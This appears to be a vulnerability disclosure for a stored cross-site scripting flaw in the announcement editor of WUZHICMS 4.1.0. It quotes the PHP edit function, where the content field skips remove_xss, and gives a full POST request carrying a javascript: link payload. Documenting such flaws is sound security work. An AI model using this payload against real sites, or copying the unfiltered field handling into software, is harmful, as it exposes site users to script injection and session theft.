# WUZHICMS4.1.0 Stored Xss In Affiche Model



# Vulnerable file

- path：`coreframe\app\affiche\admin\index.php`

- code:

  ```php
      public function edit() {
          $id = intval($GLOBALS['id']);
          if(isset($GLOBALS['submit'])) {
              $formdata = $GLOBALS['form'];
              $formdata['title'] = remove_xss($formdata['title']);
              $formdata['note'] = remove_xss($formdata['note']);
              $formdata['addtime'] = SYS_TIME;
              $formdata['endtime'] = strtotime($GLOBALS['endtime']);
              $formdata['publisher'] = get_cookie('username');
              $formdata['css'] = 'color:#'.remove_xss(ltrim($GLOBALS['title_css'],'#').';'.$GLOBALS['font_weight']);
              $linkageid = $this->db->update('affiche',$formdata,array('id'=>$id));
              MSG(L('operation success'),'?m=affiche&f=index&v=listing'.$this->su());
          } else {
              $show_formjs = 1;
              $form = load_class('form');
              load_function('admin');
              $r = $this->db->get_one('affiche',array('id'=>$id));
              $endtime = date('Y-m-d H:i:s',$r['endtime']);
              $styles = style($r['css']);//color:#ff0000;font-weight:bold
              $font_weight = $styles['font-weight'];
              $color = $styles['color'];
              include $this->template('edit');
          }
      }
  
  ```

  

## Frontend corresponding position

![image-20240405222100563](https://github.com/majic-banana/vulnerability/blob/main/photo/image-20240405222100563)

## Payload

- **Request packet**：

  ```http
  POST /index.php?m=affiche&f=index&v=edit&id=3&_su=wuzhicms&_menuid=110 HTTP/1.1
  Host: wuzhicms
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 269
  Origin: http://wuzhicms
  Connection: close
  Referer: http://wuzhicms/index.php?m=affiche&f=index&v=edit&id=3&_su=wuzhicms&_menuid=110
  Cookie: PHPSESSID=7ibu18jldq3dp55e3lj4f60pc0; TFq_uid=q8Ju2kiktzdMetzpayHBxg%3D%3D; TFq_username=dZXrKgf9xU9g3PImTyVkQg%3D%3D; TFq_wz_name=XDDWy1%2FQ2bB9Ivj%2BLCel%2BA%3D%3D; TFq_siteid=PolyVsMuEXsEf3i0Yid%2BzA%3D%3D; TFq_userkeys=sZatwUmuJEakExFLDzC9Dw%3D%3D; TFq_auth=gCBupfDG1coerGNduwSyWpeQBfOvFmKsyurY3X5DxxZbFQ7MexXFts76eIheXRZ1JjWvWlqTpvGG24gP23OQidw7%2BSNflFU2sDYib27xcfPfUlDuusJR5g%3D%3D; TFq__uid=BAOner0rLWW%2FYHNjC0TTmg%3D%3D; TFq__username=%2F811AAaRXtYmvw4jlJtCfQ%3D%3D; TFq__groupid=289CW46PX%2FbD90clmKWPBA%3D%3D; TFq_truename=admin; TFq_modelid=10
  Upgrade-Insecure-Requests: 1
  
  form%5Btitle%5D=test&title_css=%23438ccb&font_weight=&form%5Bstatus%5D=2&endtime=2014-11-17+00%3A00%3A00&form%5Bcontent%5D=%3Cp%3Etest_magic%3Ca+href%3D%22javascript%3Aalert%28777%29%22%3EXSS%3C%2Fa%3E%3C%2Fp%3E%0D%0A&form%5Bnote%5D=note_magic&submit=%E6%8F%90%E4%BA%A4
  ```



## Analysis

- $formdata[content] is **not** filtered like other parameter(title,note,....).

  ![image-20240405222633793](C:\Users\王晨旭\Desktop\笔记\picture\image-20240405222633793.png)





## Result

- database result

  ![image-20240405222928880](C:\Users\王晨旭\Desktop\笔记\picture\image-20240405222928880.png)

- Frontend result

  ![image-20240405223105305](C:\Users\王晨旭\Desktop\笔记\picture\image-20240405223105305.png)
